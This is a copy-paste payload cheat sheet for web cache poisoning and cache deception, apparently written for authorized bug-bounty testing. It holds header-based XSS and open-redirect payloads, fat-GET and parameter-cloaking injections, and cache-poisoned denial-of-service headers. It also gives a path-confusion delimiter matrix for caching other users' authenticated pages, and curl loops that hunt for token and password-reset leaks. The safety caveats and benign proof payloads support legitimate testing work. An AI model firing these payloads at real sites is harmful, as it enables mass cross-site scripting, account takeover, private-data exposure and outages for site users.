# Web Cache Poisoning & Deception — Attack Arsenal (copy-paste)

**Author:** x8bitranjit
Headers, payloads, delimiter matrices, and cache fingerprints for the guide. **Authorized targets only.** Every poisoning
probe uses a **cache-buster** so you land on YOUR key, never the shared production entry (Guide §3/§20). The finding is
**"the cache re-serves it to a different request"** — not a lone reflected header (Guide §17).

---

## 0. Cache fingerprint — read the response, name the layer

| Header seen | Cache layer | Hit tell |
|-------------|-------------|----------|
| `CF-Cache-Status: HIT/MISS/DYNAMIC/EXPIRED/BYPASS` + `cf-ray` | **Cloudflare** | `HIT` (DYNAMIC = not cached) |
| `X-Cache: HIT/MISS` + `X-Served-By` + `X-Timer` | **Fastly (Varnish)** | `X-Cache: HIT`, `X-Cache-Hits > 0` |
| `X-Cache: Hit from cloudfront` + `Via: …cloudfront` + `X-Amz-Cf-Id` | **AWS CloudFront** | `Hit from cloudfront` |
| `X-Cache` + `X-Cache-Remote` + `Server: AkamaiGHost` / `X-Akamai-*` | **Akamai** | `TCP_HIT`/`TCP_MEM_HIT` |
| `X-Varnish: <id> <id2>` (two IDs) + `Age` | **Varnish** | two IDs = hit |
| `X-Drupal-Cache: HIT` / `X-Drupal-Dynamic-Cache` | **Drupal** | `HIT` |
| `X-Vercel-Cache: HIT/STALE/MISS/PRERENDER` | **Vercel/Next.js** | `HIT`/`PRERENDER` |
| `X-Litespeed-Cache` / `X-Proxy-Cache` / `X-Nginx-Cache` | LiteSpeed / nginx | `HIT` |
| `Age: <n>` (grows on repeat) + `Cache-Control: public` | any shared cache | `Age` rising = cached |

```
# quick fingerprint (twice, note the diff):
curl -s -D- -o/dev/null "https://t/path?cb=$RANDOM"
curl -s -D- -o/dev/null "https://t/path?cb=SAMEVALUE"   # 2nd time same cb → HIT if cacheable
# poc/cache_detect.py automates hit/miss + layer id.
```

---

## 1. Cache-buster (do this FIRST — safety + isolation, Guide §3)

```
?cb=UNIQUE                     # a random query param — usually keyed → your own MISS
?utm_x=UNIQUE                  # if plain cb is ignored, try an analytics-style param
/path/;cb=UNIQUE               # path-based buster when query is unkeyed
Origin/Host cache-buster       # some caches key on Host — a unique vhost isolates you (lab)
# VERIFY: each new value = a fresh MISS (Age:0). If your buster is ALSO unkeyed, you have no isolation →
#         do NOT fire payloads at a shared prod cache (Guide §20).
```

---

## 2. Unkeyed-input discovery — canary headers (Guide §4)

Plant a canary, check (a) reflected and (b) served to a request that DIDN'T send it.
```
X-Forwarded-Host: canary8f3a.oastify.com
X-Host: canary8f3a.oastify.com
X-Forwarded-Scheme: nothttps                 # some apps → redirect to https://host → combine with XFH
X-Forwarded-Proto: http
X-Forwarded-Server: canary8f3a.oastify.com
X-Forwarded-Port: 1337
X-Original-URL: /canary8f3a
X-Rewrite-URL: /canary8f3a
X-Original-Host: canary8f3a.oastify.com
X-Forwarded-For: canary8f3a
Forwarded: host=canary8f3a.oastify.com
X-HTTP-Method-Override: POST
X-Forwarded-SSL: off
X-Wap-Profile: http://canary8f3a.oastify.com/x.xml
# also brute the app's custom headers with Param Miner's wordlist.
```
Canary reflected in: page links · `<script src>`/`<link href>` · `Location` · `<meta>`/canonical/`og:url` · JSON config · a header.
```
# the 4-step confirm (poc/poison_probe.py does this per header, cache-buster-safe):
1) GET /p?cb=U   with X-Forwarded-Host: canary8f3a.oastify.com
2) grep "canary8f3a" in response → reflected?
3) GET /p?cb=U   WITHOUT the header
4) still "canary8f3a"? → UNKEYED + POISONABLE.
```

---

## 3. Poisoning payloads by reflection sink (Guide §5–§9)

**A) Reflected into a resource URL (`<script src>`/`<link>`/import) → mass XSS (benign proof host):**
```
X-Forwarded-Host: YOURHOST.oastify.com
  → <script src="//YOURHOST.oastify.com/app.js">   (serve a HARMLESS alert(document.domain) on YOUR host, YOUR key only)
X-Forwarded-Host: YOURHOST.oastify.com/a"></script><script>alert(document.domain)</script>   (if raw HTML context)
```
**B) Reflected into `Location`/canonical → cached open redirect (→ OAuth theft):**
```
X-Forwarded-Host: YOURDOMAIN.example
X-Forwarded-Scheme: nothttps                 # classic pair: forces a redirect to https://YOURDOMAIN
  → Location: https://YOURDOMAIN.example/…   cached and served to everyone.
```
**C) Reflected raw into HTML (attribute/body), no encoding → cached reflected-XSS:**
```
X-Forwarded-Host: a"><script>alert(document.domain)</script>
X-Forwarded-Host: a'accesskey='x'onclick='alert(document.domain)     (attribute breakout)
```
**D) Fat GET (origin reads GET body; cache ignores it) — Guide §7:**
```
GET /search?cb=U HTTP/1.1
Host: t
Content-Type: application/x-www-form-urlencoded
Content-Length: 24

q="><script>alert(1)</script>
```
**E) Duplicate / array / cloaked params — Guide §7:**
```
/p?cb=U&lang=en&lang=<payload>
/p?cb=U&param[]=a&param[]=<payload>
/p?cb=U&utm_content=x;callback=<payload>          # ';' cloaking (cache sees one value, origin splits)
/p?cb=U&keyed=x%0acallback=<payload>              # encoded-newline delimiter split
/jsonp?cb=U&callback=<payload>                     # JSONP callback reflected into JS → cached XSS
```
**F) Header that lands in a cached JS/CSS resource (resource poisoning §6):**
```
GET /static/config.js?cb=U   with  X-Forwarded-Host: YOURHOST   → window.API="//YOURHOST" cached for all pages.
```

---

## 4. CPDoS payloads (availability — AUTHORIZE, prove on YOUR key only, Guide §10/§20)

```
HHO (Header Oversize) — origin 400/431, CDN caches the error:
  X-Oversized-Header: AAAA…(8–20 KB of A)…AAAA
HMC (Meta Character) — control char origin rejects, cache stores:
  X-Meta: \n     X-Meta: \a     X-Meta: %00     X-Meta: \r
HMO (Method Override) — origin errors, error cached for the GET key:
  X-HTTP-Method-Override: DELETE
  X-HTTP-Method: PUT
  X-Method-Override: POST
# confirm: after the crafted request, a NORMAL request to the same (busted) key returns the cached 4xx.
# DO NOT run against the live shared key real users hit.
```

---

## 5. Cache DECEPTION — path-confusion & delimiter matrix (Guide §12–§14)

Base = a sensitive authenticated endpoint (`/account`, `/api/me`, `/settings`, `/orders`, `/profile`). Request each **with your
own session**, watch for (a) your private content returned AND (b) a cache HIT on a session-less repeat.
```
# static-suffix (extension rule):
/account.css      /account.js      /account.jpg     /account.ico    /account.png    /account.svg
/account/x.css    /account/x.js    /account%2fx.css  /account/nonexistent.css

# path parameter (matrix ';' — origin ignores, cache sees .css):
/account;x.css    /account;foo=bar.css   /account;.css

# encoded delimiters (origin truncates at the DECODED char, cache keys the .css suffix):
/account%3f.css   (?)      /account%23.css  (#)      /account%2f.css  (/)
/account%00.css   (null)   /account%0a.css  (\n)     /account%09.css  (\t)    /account%5c.css (\)
/account%20.css   (space)  /account%3b.css  (;)

# double / mixed encoding:
/account%252ecss   /account%253f.css   /account%25230.css

# directory-rule confusion (route a dynamic page "under" a cached static dir):
/static/..%2faccount     /assets/%2e%2e/settings     /media/..%2f..%2fapi/me

# normalization:
/account/.css     /account/./x.css     /Account.css (case)     /account.CSS
```
```
# the two-request confirm (poc/deception_probe.py):
A)  curl -s "https://t/account/x.css"  -H "Cookie: session=YOURS"     → your private marker (e.g. a-8f3a@poc) + cacheable
B)  curl -s "https://t/account/x.css"                                 → SAME marker with NO cookie = deception PROVEN
```

**Endpoint discovery — find the cacheable-sensitive routes first (Guide §14.1):**
```
# for each authed page: does appending a static suffix STILL return your private data + flip to a HIT?
for p in account profile settings billing orders messages api/me dashboard; do
  curl -s -D- -o/dev/null "https://t/$p/x.css" -H "Cookie: session=YOURS" | grep -Ei "^(HTTP|age|cf-cache-status|x-cache)"
done
# 200 + your private body + HIT-on-repeat = deception-prone. Password-reset landing pages are prime (token in body).
```
**CDN tendency (fingerprint via §0, then test each row — Guide §13):** Cloudflare = static-extension list + Cache Deception Armor (Content-Type must match the ext → use a `;`/encoded-delimiter row); Akamai/CloudFront = extension + path pattern (`;` and `%3f`/`%23`/`%2f` win); Varnish/Fastly = VCL-defined, test everything.

---

## 6. What to grep for in a deception hit (rate the severity, Guide §18)

```
session / token / bearer / authorization / csrf / xsrf / _token / api[_-]?key / secret
reset / password / email / phone / address / ssn / card / account[_-]?id
# token/reset/api-key in the cached body → CRITICAL (ATO).  CSRF/PII only → HIGH.
```

---

## 7. Tools

| Tool | Use |
|------|-----|
| **Param Miner** (Burp) | Unkeyed header/param discovery — the primary poisoning tool (cache-busted canaries) |
| **Burp Repeater** | Manual hit/miss oracle, cache-buster, canary reflect, served-to-others proof |
| **`poc/cache_detect.py`** | Is it cached? which CDN? hit/miss + Age oracle |
| **`poc/poison_probe.py`** | Cache-buster-safe unkeyed-input canary prober over a header list (low-FP) |
| **`poc/deception_probe.py`** | Two-request with/without-session deception confirmer against your marker |
| **web-cache-vulnerability-scanner** (`wcvs`, Hackmanit, Go) | Automated poisoning scanner (verify by hand) |
| **nuclei** `-tags cache` | Quick misconfig sweep |
| **Interactsh / Collaborator** | OOB host for the canary (`X-Forwarded-Host: id.oast.fun`) + blind confirmation |

---

## 8. Triage rules (don't waste a report)

```
unkeyed input reflected + SERVED to a request without it + XSS/redirect sink   → REPORT (Critical/High); benign marker
cached JS/CSS reflects your input → site-wide                                  → REPORT Critical (resource poisoning)
/private.css returns your data AND a session-less repeat returns it (2 accts)  → REPORT (Critical if token, High if PII)
oversized/meta header → origin errors AND the error is CACHED (your key)       → REPORT CPDoS (authorize first)
header merely reflected, response NOT cached / keyed                           → NOT a cache bug (self-XSS at best)
Param Miner "unkeyed" with no reflection/served-to-others                       → reproduce by hand first
deception "works" only with YOUR cookie present                                → you fetched your own page; not proven
```

> Cache-buster on every poisoning probe. Two of your OWN accounts for deception. One benign proof of the
> **"served to a different request"** half, then STOP. Recommend a cache purge in the report. Authorized targets only.
